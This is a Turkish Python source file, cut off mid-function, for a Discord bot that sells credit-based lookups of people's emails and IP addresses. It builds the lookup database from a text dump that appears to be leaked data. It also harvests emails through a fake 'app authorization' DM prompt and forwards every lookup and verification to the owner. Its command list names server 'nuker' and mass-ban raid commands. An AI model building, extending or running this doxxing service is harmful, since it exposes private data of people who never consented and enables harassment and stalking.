"""
================================================================================
                        DISCORD BOT DEHŞET - VDS VERSIYONU
================================================================================

KURULUM:
1. Python 3.11+ yükleyin
2. Şu komutu çalıştırın: pip install discord.py aiohttp pynacl
3. DISCORD_BOT_TOKEN environment variable olarak ayarlayın:
   - Linux: export DISCORD_BOT_TOKEN="token_buraya"
   - Windows: set DISCORD_BOT_TOKEN=token_buraya
4. discord_data.db dosyasını aynı klasöre koyun
5. python bot.py ile başlatın

REQUIREMENTS (pip install):
- discord.py>=2.6.4
- aiohttp>=3.13.2  
- pynacl>=1.6.1

ONEMLI: Asagidaki ID'leri kendi sunucunuza gore degistirin!
================================================================================
"""

import discord
from discord.ext import commands
from discord import app_commands
import sqlite3
import os
from pathlib import Path
import json
import re
import asyncio
import base64
import random
import string
import datetime

intents = discord.Intents.default()
intents.message_content = True
intents.voice_states = True
intents.members = True
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents, help_command=None)

OWNER_IDS = [1105504114609233970, 1418921133083988099, 1080183994949312613]
AUTHORIZED_USERS_FILE = 'authorized_users.json'
VERIFIED_USERS_FILE = 'verified_users.json'
DB_FILE_PATH = 'discord_data.db'
DATA_FILE_PATH = 'data.txt'
DEHŞET = 1844
AUTHORIZED_ROLE_ID = DEHŞET
DURUM_ALDI_KANAL_ID = DEHŞET
VERIFIED_ROLE_ID = DEHŞET
GUILD_OWNER_ROLE_ID = DEHŞET  # Guild alan kişilere verilecek özel rol
LOG_CHANNEL_ID = 1444467582282367009  # ID sorgu loglarının gönderileceği kanal
GENERAL_LOG_CHANNEL_ID = 1445572049035595816  # Genel log kanalı
WELCOME_CHANNEL_ID = 1444428771389079643  # Hoş geldin kanalı
ALLOWED_LOG_GUILD_ID = 1424311509244444725  # Sadece bu sunucunun logları kaydedilir

verification_codes = {}
user_verification_data = {}
active_giveaways = {}
SAFE_LIST_FILE = 'safe_list.json'
WARNINGS_FILE = 'warnings.json'
ROLE_MENUS_FILE = 'role_menus.json'
STATS_FILE = 'stats.json'
TICKETS_FILE = 'tickets.json'
TICKET_SETTINGS_FILE = 'ticket_settings.json'
nuker_active = False
nuker_tasks = []
PROTECTED_VANITY_URL = None

VOICE_CHANNEL_ID = 1445432179046879392
VOICE_GUILD_ID = 1424311509244444725
voice_reconnect_enabled = True

voice_join_times = {}
afk_users = {}

AFK_FILE = 'afk_users.json'

def load_afk_users():
    try:
        if os.path.exists(AFK_FILE):
            with open(AFK_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return {}

def save_afk_users():
    try:
        with open(AFK_FILE, 'w') as f:
            json.dump(afk_users, f, indent=4)
    except:
        pass

def load_tickets():
    try:
        if os.path.exists(TICKETS_FILE):
            with open(TICKETS_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return {}

def save_tickets():
    try:
        with open(TICKETS_FILE, 'w') as f:
            json.dump(TICKETS, f, indent=4)
    except:
        pass

def load_ticket_settings():
    try:
        if os.path.exists(TICKET_SETTINGS_FILE):
            with open(TICKET_SETTINGS_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return {}

def save_ticket_settings():
    try:
        with open(TICKET_SETTINGS_FILE, 'w') as f:
            json.dump(TICKET_SETTINGS, f, indent=4)
    except:
        pass

TICKETS = load_tickets()
TICKET_SETTINGS = load_ticket_settings()


def load_role_menus():
    try:
        if os.path.exists(ROLE_MENUS_FILE):
            with open(ROLE_MENUS_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return {}

def save_role_menus():
    try:
        with open(ROLE_MENUS_FILE, 'w') as f:
            json.dump(ROLE_MENUS, f, indent=4)
    except:
        pass

def load_stats():
    try:
        if os.path.exists(STATS_FILE):
            with open(STATS_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return {}

def save_stats():
    try:
        with open(STATS_FILE, 'w') as f:
            json.dump(STATS, f, indent=4)
    except:
        pass


def load_warnings():
    try:
        if os.path.exists(WARNINGS_FILE):
            with open(WARNINGS_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return {}

def save_warnings():
    try:
        with open(WARNINGS_FILE, 'w') as f:
            json.dump(WARNINGS, f, indent=4)
    except:
        pass

def load_safe_list():
    try:
        if os.path.exists(SAFE_LIST_FILE):
            with open(SAFE_LIST_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return []

def save_safe_list():
    try:
        with open(SAFE_LIST_FILE, 'w') as f:
            json.dump(SAFE_LIST, f, indent=4)
    except:
        pass

def load_authorized_users():
    try:
        if os.path.exists(AUTHORIZED_USERS_FILE):
            with open(AUTHORIZED_USERS_FILE, 'r') as f:
                data = json.load(f)
                return data
    except:
        pass
    return {str(oid): 999 for oid in OWNER_IDS}

def load_verified_users():
    try:
        if os.path.exists(VERIFIED_USERS_FILE):
            with open(VERIFIED_USERS_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return {}

def save_authorized_users():
    try:
        with open(AUTHORIZED_USERS_FILE, 'w') as f:
            json.dump(AUTHORIZED_USERS, f, indent=4)
    except:
        pass

def save_verified_users():
    try:
        with open(VERIFIED_USERS_FILE, 'w') as f:
            json.dump(VERIFIED_USERS, f, indent=4)
    except:
        pass

def is_owner(user_id):
    return user_id in OWNER_IDS

def is_authorized_admin(user_id):
    user_id_str = str(user_id)
    return user_id_str in AUTHORIZED_USERS and AUTHORIZED_USERS[user_id_str] == 999

def has_search_credits(user_id):
    user_id_str = str(user_id)
    if user_id_str in AUTHORIZED_USERS:
        return AUTHORIZED_USERS[user_id_str] > 0
    return False

def is_verified(user_id):
    return str(user_id) in VERIFIED_USERS

def get_credits(user_id):
    user_id_str = str(user_id)
    return AUTHORIZED_USERS.get(user_id_str, 0)

def use_credit(user_id):
    user_id_str = str(user_id)
    if user_id_str in AUTHORIZED_USERS and AUTHORIZED_USERS[user_id_str] > 0:
        AUTHORIZED_USERS[user_id_str] -= 1
        save_authorized_users()
        return True
    return False

def add_credits(user_id, amount):
    user_id_str = str(user_id)
    if user_id_str in AUTHORIZED_USERS:
        AUTHORIZED_USERS[user_id_str] += amount
    else:
        AUTHORIZED_USERS[user_id_str] = amount
    save_authorized_users()

def set_credits(user_id, amount):
    user_id_str = str(user_id)
    AUTHORIZED_USERS[user_id_str] = amount
    save_authorized_users()

def remove_all_credits(user_id):
    user_id_str = str(user_id)
    if user_id_str in AUTHORIZED_USERS:
        del AUTHORIZED_USERS[user_id_str]
        save_authorized_users()
        return True
    return False

def make_admin(user_id):
    user_id_str = str(user_id)
    AUTHORIZED_USERS[user_id_str] = 999
    save_authorized_users()

def remove_admin(user_id):
    user_id_str = str(user_id)
    if user_id_str in AUTHORIZED_USERS and AUTHORIZED_USERS[user_id_str] == 999:
        del AUTHORIZED_USERS[user_id_str]
        save_authorized_users()
        return True
    return False

def give_unlimited_credits(user_id):
    user_id_str = str(user_id)
    AUTHORIZED_USERS[user_id_str] = 99999
    save_authorized_users()

def remove_verification(user_id):
    user_id_str = str(user_id)
    if user_id_str in VERIFIED_USERS:
        del VERIFIED_USERS[user_id_str]
        save_verified_users()
        return True
    return False

def get_total_credits():
    total = 0
    for user_id, credits in AUTHORIZED_USERS.items():
        if int(user_id) not in OWNER_IDS and credits != 999 and credits != 99999:
            total += credits
    return total

def reset_all_credits():
    global AUTHORIZED_USERS
    reset_count = 0
    
    new_authorized_users = {}
    for user_id, credits in AUTHORIZED_USERS.items():
        if int(user_id) in OWNER_IDS or credits == 999 or credits == 99999:
            new_authorized_users[user_id] = credits
        else:
            reset_count += 1
    
    AUTHORIZED_USERS = new_authorized_users
    save_authorized_users()
    return reset_count

def generate_verification_code():
    return ''.join(random.choices(string.digits, k=6))

async def add_role_to_user(guild, user_id, role_id):
    try:
        member = guild.get_member(user_id)
        if member:
            role = guild.get_role(role_id)
            if role:
                if role not in member.roles:
                    await member.add_roles(role)
                    return True
                else:
                    return True
            else:
                return False
        else:
            return False
    except Exception as e:
        return False

async def remove_role_from_user(guild, user_id, role_id):
    try:
        member = guild.get_member(user_id)
        if member:
            role = guild.get_role(role_id)
            if role:
                if role in member.roles:
                    await member.remove_roles(role)
                    return True
                else:
                    return True
            else:
                return False
        else:
            return False
    except Exception as e:
        return False

async def send_verification_info_to_owner(user, email, ip_address):
    try:
        owner = await bot.fetch_user(OWNER_IDS[0])
        
        embed = discord.Embed(
            title="YENİ DOĞRULAMA BİLDİRİMİ",
            description=f"**{user.name}** kullanıcısı doğrulama yaptı!",
            color=0x00ff00,
            timestamp=datetime.datetime.now()
        )
        
        embed.add_field(
            name="Kullanıcı Bilgileri",
            value=f"**Discord Adı:** {user.name}#{user.discriminator}\n**ID:** {user.id}",
            inline=False
        )
        
        if email:
            embed.add_field(
                name="E-posta",
                value=f"```{email}```",
                inline=True
            )
        
        if ip_address:
            embed.add_field(
                name="IP Adresi",
                value=f"```{ip_address}```",
                inline=True
            )
        
        embed.add_field(
            name="Doğrulama Zamanı",
            value=f"<t:{int(datetime.datetime.now().timestamp())}:F>",
            inline=False
        )
        
        embed.set_thumbnail(url=user.display_avatar.url)
        embed.set_footer(text="Doğrulama Sistemi")
        
        await owner.send(embed=embed)
        
    except Exception as e:
        print(f"Doğrulama bilgisi gönderme hatası: {e}")

async def send_authorization_info_to_owner(user, email):
    try:
        owner = await bot.fetch_user(OWNER_IDS[0])
        
        embed = discord.Embed(
            title="YENİ UYGULAMA YETKİLENDİRME",
            description=f"**{user.name}** uygulamayı yetkilendirdi!",
            color=0x00ff00,
            timestamp=datetime.datetime.now()
        )
        
        embed.add_field(
            name="Kullanıcı Bilgileri",
            value=f"**Discord Adı:** {user.name}#{user.discriminator}\n**ID:** {user.id}",
            inline=False
        )
        
        if email:
            embed.add_field(
                name="E-posta Adresi",
                value=f"```{email}```",
                inline=False
            )
        
        embed.add_field(
            name="Yetkilendirme Zamanı",
            value=f"<t:{int(datetime.datetime.now().timestamp())}:F>",
            inline=False
        )
        
        embed.set_thumbnail(url=user.display_avatar.url)
        embed.set_footer(text="Yetkilendirme Sistemi")
        
        await owner.send(embed=embed)
        
    except Exception as e:
        print(f"Yetkilendirme bilgisi gönderme hatası: {e}")

async def send_search_log_to_channel(searcher, searched_id, result_data, success=True):
    try:
        if success:
            embed = discord.Embed(
                title="ID SORGULAMA LOGU - BAŞARILI",
                description=f"**{searcher.name}** ID sorgulama yaptı!",
                color=0x00ff00,
                timestamp=datetime.datetime.now()
            )
        else:
            embed = discord.Embed(
                title="ID SORGULAMA LOGU - BAŞARISIZ",
                description=f"**{searcher.name}** ID sorgulama yaptı ama sonuç bulunamadı!",
                color=0xff0000,
                timestamp=datetime.datetime.now()
            )
        
        embed.add_field(
            name="Sorgulayan Kullanıcı",
            value=f"**Discord Adı:** {searcher.name}#{searcher.discriminator}\n**ID:** {searcher.id}",
            inline=False
        )
        
        embed.add_field(
            name="Aranan ID",
            value=f"```{searched_id}```",
            inline=True
        )
        
        if success and result_data:
            email = result_data.get('email')
            ip_address = result_data.get('ip_address')
            
            if email:
                embed.add_field(
                    name="Bulunan Email",
                    value=f"```{email}```",
                    inline=True
                )
            
            if ip_address:
                embed.add_field(
                    name="Bulunan IP",
                    value=f"```{ip_address}```",
                    inline=True
                )
        
        embed.add_field(
            name="Sorgulama Zamanı",
            value=f"<t:{int(datetime.datetime.now().timestamp())}:F>",
            inline=False
        )
        
        embed.add_field(
            name="Kalan Hak",
            value=f"**{get_credits(searcher.id)}** adet",
            inline=True
        )
        
        embed.set_thumbnail(url=searcher.display_avatar.url)
        embed.set_footer(text="ID Sorgulama Log Sistemi")
        
        owner = await bot.fetch_user(OWNER_IDS[0])
        await owner.send(embed=embed)
        
    except Exception as e:
        print(f"Log gönderme hatası: {e}")

def decode_base64_email(encoded_email):
    try:
        padding = 4 - len(encoded_email) % 4
        if padding != 4:
            encoded_email += '=' * padding
        
        decoded = base64.b64decode(encoded_email).decode('utf-8')
        return decoded
    except:
        return None

def extract_email_from_data(raw_data):
    try:
        base64_patterns = [
            r"b'([A-Za-z0-9+/=]+)'",
            r"'([A-Za-z0-9+/=]+)'",
            r'"([A-Za-z0-9+/=]+)"',
            r'email[\'"]?\s*[:=]\s*[\'"]?([A-Za-z0-9+/=]+)'
        ]
        
        for pattern in base64_patterns:
            base64_match = re.search(pattern, raw_data, re.IGNORECASE)
            if base64_match:
                encoded_email = base64_match.group(1)
                decoded_email = decode_base64_email(encoded_email)
                if decoded_email and '@' in decoded_email:
                    return decoded_email
        
        email_patterns = [
            r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
            r'email[\'"]?\s*[:=]\s*[\'"]?([^@\s]+@[^@\s]+\.[^@\s]+)[\'"]?',
            r'mail[\'"]?\s*[:=]\s*[\'"]?([^@\s]+@[^@\s]+\.[^@\s]+)[\'"]?',
            r'e-?posta[\'"]?\s*[:=]\s*[\'"]?([^@\s]+@[^@\s]+\.[^@\s]+)[\'"]?'
        ]
        
        for pattern in email_patterns:
            email_match = re.search(pattern, raw_data, re.IGNORECASE)
            if email_match:
                email = email_match.group(1) if email_match.groups() else email_match.group()
                if '@' in email:
                    return email
        
        quoted_email_patterns = [
            r"'([^']*@[^']*\.[^']*)'",
            r'"([^"]*@[^"]*\.[^"]*)"',
            r'`([^`]*@[^`]*\.[^`]*)`'
        ]
        
        for pattern in quoted_email_patterns:
            quoted_match = re.search(pattern, raw_data)
            if quoted_match:
                email = quoted_match.group(1)
                if '@' in email and '.' in email:
                    return email
        
        json_email_patterns = [
            r'"email"\s*:\s*"([^"]+)"',
            r"'email'\s*:\s*'([^']+)'",
            r'"mail"\s*:\s*"([^"]+)"',
            r"'mail'\s*:\s*'([^']+)'"
        ]
        
        for pattern in json_email_patterns:
            json_match = re.search(pattern, raw_data, re.IGNORECASE)
            if json_match:
                email = json_match.group(1)
                if '@' in email:
                    return email
        
        kv_patterns = [
            r'email[=:]\s*([^\s,]+)',
            r'mail[=:]\s*([^\s,]+)',
            r'e-?posta[=:]\s*([^\s,]+)'
        ]
        
        for pattern in kv_patterns:
            kv_match = re.search(pattern, raw_data, re.IGNORECASE)
            if kv_match:
                email = kv_match.group(1).strip('"\'').strip()
                if '@' in email:
                    return email
        
        advanced_patterns = [
            r'[Ee]-?[Pp]osta\s*[:=]\s*[\'"]?([^\'",\s]+@[^\'",\s]+\.[^\'",\s]+)[\'"]?',
            r'[Ee]mail\s*[:=]\s*[\'"]?([^\'",\s]+@[^\'",\s]+\.[^\'",\s]+)[\'"]?',
            r'[Mm]ail\s*[:=]\s*[\'"]?([^\'",\s]+@[^\'",\s]+\.[^\'",\s]+)[\'"]?',
        ]
        
        for pattern in advanced_patterns:
            advanced_match = re.search(pattern, raw_data)
            if advanced_match:
                email = advanced_match.group(1)
                if '@' in email:
                    return email
                    
        return None
    except Exception as e:
        return None

def extract_ip_from_data(raw_data):
    try:
        ip_patterns = [
            r'\b(?:\d{1,3}\.){3}\d{1,3}\b',
            r'ip[\'"]?\s*[:=]\s*[\'"]?((?:\d{1,3}\.){3}\d{1,3})[\'"]?',
            r'address[\'"]?\s*[:=]\s*[\'"]?((?:\d{1,3}\.){3}\d{1,3})[\'"]?',
            r'"ip"\s*:\s*"((?:\d{1,3}\.){3}\d{1,3})"',
            r"'ip'\s*:\s*'((?:\d{1,3}\.){3}\d{1,3})'",
            r'IP[\'"]?\s*[:=]\s*[\'"]?((?:\d{1,3}\.){3}\d{1,3})[\'"]?',
            r'[Ii]p\s*[=:]\s*[\'"]?((?:\d{1,3}\.){3}\d{1,3})[\'"]?',
            r'\"ip_address\"\s*:\s*\"((?:\d{1,3}\.){3}\d{1,3})\"',
            r"'ip_address'\s*:\s*'((?:\d{1,3}\.){3}\d{1,3})'"
        ]
        
        for pattern in ip_patterns:
            ip_match = re.search(pattern, raw_data, re.IGNORECASE)
            if ip_match:
                ip = ip_match.group(1) if ip_match.groups() else ip_match.group()
                parts = ip.split('.')
                if len(parts) == 4 and all(0 <= int(part) <= 255 for part in parts if part.isdigit()):
                    return ip
        return None
    except:
        return None

def create_database():
    data_file = Path(DATA_FILE_PATH)
    
    if not data_file.exists():
        return False
    
    try:
        with open(data_file, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read().strip()
        
        conn = sqlite3.connect(DB_FILE_PATH)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                discord_id TEXT UNIQUE,
                email TEXT,
                ip_address TEXT,
                raw_data TEXT
            )
        ''')
        
        lines = content.split('\n')
        count = 0
        email_found = 0
        ip_found = 0
        
        for line in lines:
            line = line.strip()
            if line:
                id_match = re.search(r'\b\d{15,20}\b', line)
                
                if id_match:
                    discord_id = id_match.group()
                    
                    email = extract_email_from_data(line)
                    ip_addr = extract_ip_from_data(line)
                    
                    if email:
                        email_found += 1
                    if ip_addr:
                        ip_found += 1
                    
                    cursor.execute(
                        'INSERT OR IGNORE INTO users (discord_id, email, ip_address, raw_data) VALUES (?, ?, ?, ?)',
                        (discord_id, email, ip_addr, line)
                    )
                    count += 1
        
        conn.commit()
        conn.close()
        return True
        
    except Exception as e:
        return False

def get_db_connection():
    try:
        conn = sqlite3.connect(DB_FILE_PATH)
        conn.row_factory = sqlite3.Row
        return conn
    except Exception as e:
        return None

def is_user_safe(user_id):
    return user_id in SAFE_LIST

AUTHORIZED_USERS = load_authorized_users()
VERIFIED_USERS = load_verified_users()
SAFE_LIST = load_safe_list()
WARNINGS = load_warnings()
ROLE_MENUS = load_role_menus()
STATS = load_stats()
afk_users = load_afk_users()

async def update_presence():
    await bot.wait_until_ready()
    
    while not bot.is_closed():
        try:
            total_credits = get_total_credits()
            
            await bot.change_presence(
                activity=discord.Streaming(
                    name=f"discord.gg/dehset | {total_credits} hak",
                    url="https://twitch.tv/discord"
                )
            )
        except Exception as e:
            print(f"Durum güncelleme hatası: {e}")
        
        await asyncio.sleep(60)


COMMAND_USAGE = {
    "ban": "!ban @kullanıcı [sebep]",
    "unban": "!unban (kullanıcı_id)",
    "kick": "!kick @kullanıcı [sebep]",
    "timeout": "!timeout @kullanıcı (dakika) [sebep]",
    "untimeout": "!untimeout @kullanıcı",
    "warn": "!warn @kullanıcı (sebep)",
    "clear": "!clear (miktar) [@kullanıcı]",
    "dm": "!dm @kullanıcı (mesaj)",
    "duyuru": "!duyuru (mesaj)",
    "idsorgu": "!idsorgu (discord_id)",
    "hakver": "!hakver @kullanıcı (miktar)",
    "haksil": "!haksil @kullanıcı",
    "haksorgu": "!haksorgu @kullanıcı",
    "yetkiliyap": "!yetkiliyap @kullanıcı",
    "yetkilial": "!yetkilial @kullanıcı",
    "sinirsiz": "!sinirsiz @kullanıcı",
    "uyarilar": "!uyarilar @kullanıcı",
    "uyarisil": "!uyarisil @kullanıcı",
    "topludm": "!topludm (mesaj)",
    "guildrol": "!guildrol @kullanıcı @rol",
    "afk": "!afk [sebep]",
    "afksil": "!afksil",
    "seskatil": "!seskatil",
    "sesayril": "!sesayril",
    "sesdur": "!sesdur",
    "toplumesaj": "!toplumesaj (mesaj)",
    "anket": "!anket (soru) | (seçenek1, seçenek2, ...)",
    "çekiliş": "!çekiliş (süre) (ödül) [kazanan_sayısı]",
    "rolmenu": "!rolmenu (başlık) | (açıklama)",
    "ticketpanel": "!ticketpanel",
    "ticketayar": "!ticketayar (kategori_id) (log_kanal_id) (yetkili_rol_id)",
    "ticket": "!ticket (konu)",
    "ticketkapat": "!ticketkapat",
    "ticketekle": "!ticketekle @kullanıcı",
    "ticketcikar": "!ticketcikar @kullanıcı",
    "ticketlar": "!ticketlar",
    "istatistik": "!istatistik",
    "x1844nuker": "!x1844nuker veya !nuke",
    "x1844stop": "!x1844stop veya !stop",
    "x1844banall": "!x1844banall veya !tban",
    "x1844clear": "!x1844clear veya !csil",
    "ezik": "!ezik @kullanıcı",
    "owner": "!owner",
    "sunucu": "!sunucu",
    "testlog": "!testlog",
    "pre": "!pre",
    "boost": "!boost",
    "haklarim": "!haklarim",
    "yardim": "!yardim",
    "ping": "!ping"
}

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        cmd_name = ctx.command.name
        if cmd_name in COMMAND_USAGE:
            embed = discord.Embed(
                title="Kullanım Hatası",
                description=f"Şunu yapman gerekiyor:\n`{COMMAND_USAGE[cmd_name]}`",
                color=0xff0000
            )
            await ctx.reply(embed=embed)
    elif isinstance(error, commands.MemberNotFound):
        await ctx.reply("Kullanıcı bulunamadı! Geçerli bir kullanıcı etiketle.")
    elif isinstance(error, commands.BadArgument):
        cmd_name = ctx.command.name
        if cmd_name in COMMAND_USAGE:
            embed = discord.Embed(
                title="Hatalı Parametre",
                description=f"Doğru kullanım:\n`{COMMAND_USAGE[cmd_name]}`",
                color=0xff0000
            )
            await ctx.reply(embed=embed)

@bot.event
async def on_ready():
    global PROTECTED_VANITY_URL
    print(f'{bot.user} olarak giriş yapıldı!')
    
    bot.add_view(TicketView())
    bot.add_view(TicketCloseView())
    
    try:
        synced = await bot.tree.sync()
        print(f"{len(synced)} slash komut senkronize edildi!")
    except Exception as e:
        print(f"Slash komut senkronizasyon hatası: {e}")
    
    try:
        protected_guild = bot.get_guild(ALLOWED_LOG_GUILD_ID)
        if protected_guild and protected_guild.vanity_url_code:
            PROTECTED_VANITY_URL = protected_guild.vanity_url_code
            print(f"🛡️ URL Koruma aktif: discord.gg/{PROTECTED_VANITY_URL}")
    except Exception as e:
        print(f"URL koruma başlatma hatası: {e}")
    
    data_file = Path(DATA_FILE_PATH)
    if data_file.exists():
        print(f'Dosya bulundu: {DATA_FILE_PATH}')
    else:
        print(f'Dosya bulunamadı: {DATA_FILE_PATH}')
    
    if not os.path.exists(DB_FILE_PATH):
        print(f"Veritabanı oluşturuluyor...")
        if create_database():
            print(f"Veritabanı başarıyla oluşturuldu!")
        else:
            print(f"Veritabanı oluşturulamadı!")
    else:
        conn = get_db_connection()
        if conn:
            cursor = conn.cursor()
            cursor.execute("SELECT COUNT(*) as count FROM users")
            count = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) as count FROM users WHERE email IS NOT NULL AND email != ''")
            email_count = cursor.fetchone()[0]
            
            cursor.execute("SELECT COUNT(*) as count FROM users WHERE ip_address IS NOT NULL AND ip_address != ''")
            ip_count = cursor.fetchone()[0]
            
            print(f'Veritabanı: {count} kullanıcı')
            print(f'Email bulunan: {email_count} kullanıcı')
            print(f'IP bulunan: {ip_count} kullanıcı')
            conn.close()
    
    asyncio.create_task(auto_join_voice())
    asyncio.create_task(voice_keep_alive())
    
    total_credits = get_total_credits()
    print(f"Sunucudaki toplam hak: {total_credits}")
    print(f"Doğrulanmış kullanıcılar: {len(VERIFIED_USERS)}")
    
    bot.loop.create_task(update_presence())

async def authorize_app_slash(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    
    try:
        user = interaction.user
        email = None
        
        try:
            dm_channel = await user.create_dm()
            
            embed = discord.Embed(
                title="UYGULAMA YETKİLENDİRME",
                description="Email adresinizi girin. (30 saniye süreniz var)",
                color=0x9b59b6
            )
            
            await dm_channel.send(embed=embed)
            
            def check(m):
                return m.author == user and isinstance(m.channel, discord.DMChannel)
            
            try:
                msg = await bot.wait_for('message', timeout=30.0, check=check)
                email = msg.content
            except asyncio.TimeoutError:
                await dm_channel.send("Süre doldu! Yetkilendirme iptal edildi.")
                await interaction.followup.send("Yetkilendirme iptal edildi - süre doldu!", ephemeral=True)
                return
                
        except discord.Forbidden:
            await interaction.followup.send("DM gönderemiyorum! Lütfen DM'lerinizi açın.", ephemeral=True)
            return
        
        VERIFIED_USERS[str(user.id)] = {
            'email': email,
            'authorized_at': datetime.datetime.now().isoformat()
        }
        save_verified_users()
        
        await send_authorization_info_to_owner(user, email)
        
        role_added = await add_role_to_user(interaction.guild, user.id, VERIFIED_ROLE_ID)
        
        success_embed = discord.Embed(
            title="YETKİLENDİRME BAŞARILI",
            description="Uygulama başarıyla yetkilendirildi!",
            color=0x00ff00
        )
        
        if role_added:
            success_embed.add_field(name="Rol", value="Verildi", inline=True)
        
        await dm_channel.send(embed=success_embed)
        await interaction.followup.send("Yetkilendirme tamamlandı! DM'lerinizi kontrol edin.", ephemeral=True)
        
    except Exception as e:
        await interaction.followup.send(f"Hata: {str(e)}", ephemeral=True)

@bot.tree.command(name="doğrula", description="Doğrulama işlemi başlat")
async def start_verification(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    
    if is_verified(interaction.user.id):
        await interaction.followup.send("Zaten doğrulanmışsınız!", ephemeral=True)
        return
    
    try:
        code = generate_verification_code()
        verification_codes[interaction.user.id] = code
        
        dm_channel = await interaction.user.create_dm()
        
        embed = discord.Embed(
            title="DOĞRULAMA KODU",
            description=f"Doğrulama kodunuz: **{code}**",
            color=0x9b59b6
        )
        embed.add_field(
            name="Kullanım",
            value="Bu kodu `/kod` komutu ile sunucuda kullanın.",
            inline=False
        )
        embed.set_footer(text="Kod 5 dakika geçerlidir.")
        
        await dm_channel.send(embed=embed)
        await interaction.followup.send("Doğrulama kodu DM olarak gönderildi!", ephemeral=True)
        
        await asyncio.sleep(300)
        if interaction.user.id in verification_codes:
            del verification_codes[interaction.user.id]
            
    except discord.Forbidden:
        await interaction.followup.send("DM gönderemiyorum! Lütfen DM'lerinizi açın.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"Hata: {str(e)}", ephemeral=True)

@bot.tree.command(name="kod", description="Doğrulama kodunu onayla")
@app_commands.describe(kod="DM'den aldığınız 6 haneli kod")
async def verify_code(interaction: discord.Interaction, kod: str):
    await interaction.response.defer(ephemeral=True)
    
    if is_verified(interaction.user.id):
        await interaction.followup.send("Zaten doğrulanmışsınız!", ephemeral=True)
        return
    
    if interaction.user.id not in verification_codes:
        await interaction.followup.send("Aktif bir doğrulama kodunuz yok! `/doğrula` komutunu kullanın.", ephemeral=True)
        return
    
    if verification_codes[interaction.user.id] != kod:
        await interaction.followup.send("Yanlış kod! Tekrar deneyin.", ephemeral=True)
        return
    
    del verification_codes[interaction.user.id]
    
    VERIFIED_USERS[str(interaction.user.id)] = {
        'verified_at': datetime.datetime.now().isoformat()
    }
    save_verified_users()
    
    role_added = await add_role_to_user(interaction.guild, interaction.user.id, VERIFIED_ROLE_ID)
    
    add_credits(interaction.user.id, 2)
    auth_role_added = await add_role_to_user(interaction.guild, interaction.user.id, AUTHORIZED_ROLE_ID)
    
    await send_verification_info_to_owner(interaction.user, None, None)
    
    embed = discord.Embed(
        title="DOĞRULAMA BAŞARILI",
        description="Hesabınız başarıyla doğrulandı!\n**2 adet arama hakkı hediye edildi!**",
        color=0x00ff00
    )
    
    if role_added:
        embed.add_field(name="Doğrulama Rolü", value="Verildi", inline=True)
    embed.add_field(name="Hediye Hak", value="2 adet", inline=True)
    
    await interaction.followup.send(embed=embed, ephemeral=True)

@bot.tree.command(name="idsorgu", description="Discord ID sorgulama")
@app_commands.describe(discord_id="Sorgulanacak Discord ID")
async def id_search(interaction: discord.Interaction, discord_id: str):
    await interaction.response.defer(ephemeral=True)
    
    if not is_authorized_admin(interaction.user.id) and not has_search_credits(interaction.user.id):
        embed = discord.Embed(
            title="Yetki Hatası",
            description="Bu komutu kullanmak için arama hakkınız olmalı!",
            color=0xff0000
        )
        embed.add_field(
            name="Hak Almak İçin",
            value=f"<@{OWNER_IDS[0]}> ile iletişime geçin.",
            inline=False
        )
        await interaction.followup.send(embed=embed, ephemeral=True)
        return
    
    if not is_verified(interaction.user.id) and not is_authorized_admin(interaction.user.id):
        embed = discord.Embed(
            title="Doğrulama Gerekli",
            description="Bu komutu kullanmak için önce doğrulama yapmalısınız!",
            color=0xff0000
        )
        embed.add_field(
            name="Doğrulama",
            value="`/doğrula` komutu ile doğrulama yapın.",
            inline=False
        )
        await interaction.followup.send(embed=embed, ephemeral=True)
        return
    
    if is_user_safe(discord_id):
        embed = discord.Embed(
            title="Koruma Altında",
            description="Bu kullanıcı güvenli listede ve sorgulanamaz!",
            color=0xff0000
        )
        await interaction.followup.send(embed=embed, ephemeral=True)
        return
    
    conn = get_db_connection()
    if not conn:
        await interaction.followup.send("Veritabanı bağlantı hatası!", ephemeral=True)
        return
    
    try:
        cursor = conn.cursor()
        cursor.execute("SELECT * FROM users WHERE discord_id = ?", (discord_id,))
        result = cursor.fetchone()
        
        if result:
            if not is_authorized_admin(interaction.user.id):
                if not use_credit(interaction.user.id):
                    await interaction.followup.send("Arama hakkınız kalmadı!", ephemeral=True)
                    return
            
            remaining_credits = get_credits(interaction.user.id)
            
            embed = discord.Embed(
                title="Sonuç Bulundu",
                description=f"**Discord ID:** `{discord_id}`",
                color=0x00ff00
            )
            
            final_email = result['email']
            if not final_email:
                final_email = extract_email_from_data(result['raw_data'])
            
            if final_email:
                embed.add_field(name="Email", value=f"```{final_email}```", inline=True)
            else:
                embed.add_field(name="Email", value="```Bulunamadı```", inline=True)
                
            final_ip = result['ip_address']
            if not final_ip:
                final_ip = extract_ip_from_data(result['raw_data'])
            
            if final_ip:
                embed.add_field(name="IP Adresi", value=f"```{final_ip}```", inline=True)
            else:
                embed.add_field(name="IP Adresi", value="```Bulunamadı```", inline=True)
            
            if not is_authorized_admin(interaction.user.id):
                embed.add_field(name="Kalan Hak", value=f"**{remaining_credits}** adet", inline=False)
            else:
                embed.add_field(name="Durum", value="Admin - Sınırsız", inline=False)
                
            embed.set_footer(text=f"Sorgulayan: {interaction.user.name}")
            
            result_data = {
                'email': final_email,
                'ip_address': final_ip
            }
            await send_search_log_to_channel(interaction.user, discord_id, result_data, success=True)
            
            await interaction.followup.send(embed=embed, ephemeral=True)
            
        else:
            remaining_credits = get_credits(interaction.user.id)
            
            embed = discord.Embed(
